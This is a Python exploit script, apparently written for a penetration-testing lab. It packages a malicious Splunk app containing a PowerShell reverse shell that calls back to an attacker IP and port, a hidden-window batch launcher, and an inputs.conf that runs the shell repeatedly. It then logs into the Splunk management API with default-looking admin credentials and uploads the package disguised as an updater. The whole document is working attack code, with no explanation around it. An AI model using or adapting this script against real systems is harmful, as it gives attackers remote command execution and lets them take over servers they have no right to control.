import io, tarfile, requests, urllib3
urllib3.disable_warnings()

LHOST = "10.10.15.112"
LPORT = "4443"
TARGET = "https://10.129.201.50:8089"

ps1 = f"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

bat = "@ECHO OFF\nPowerShell.exe -exec bypass -w hidden -Command \"& '%~dpn0.ps1'\"\nExit\n"

conf = "[script://.\\\\bin\\\\run.bat]\ndisabled = 0\nsourcetype = shell\ninterval = 10\n"

buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w:gz") as tar:
    for dir_name in ["splunk_shell", "splunk_shell/bin", "splunk_shell/default"]:
        di = tarfile.TarInfo(name=dir_name)
        di.type = tarfile.DIRTYPE
        di.mode = 0o755
        tar.addfile(di)
    for name, data in [
        ("splunk_shell/bin/run.ps1", ps1),
        ("splunk_shell/bin/run.bat", bat),
        ("splunk_shell/default/inputs.conf", conf),
    ]:
        b = data.encode()
        ti = tarfile.TarInfo(name=name)
        ti.size = len(b)
        ti.mode = 0o644
        tar.addfile(ti, io.BytesIO(b))

buf.seek(0)
token_resp = requests.post(f"{TARGET}/services/auth/login", data={"username": "admin", "password": "Welcome1"}, verify=False)
import re
token = re.search(r'<sessionKey>([^<]+)', token_resp.text).group(1)
print("Token:", token[:20], "...")

pkg = buf.read()
r = requests.post(
    f"{TARGET}/services/apps/local",
    headers={"Authorization": f"Splunk {token}"},
    files={"spl_file": ("updater.tar.gz", pkg, "application/octet-stream")},
    data={"filename": "true", "name": "splunk_shell", "update": "true"},
    verify=False
)
print(r.status_code, r.text[:300])
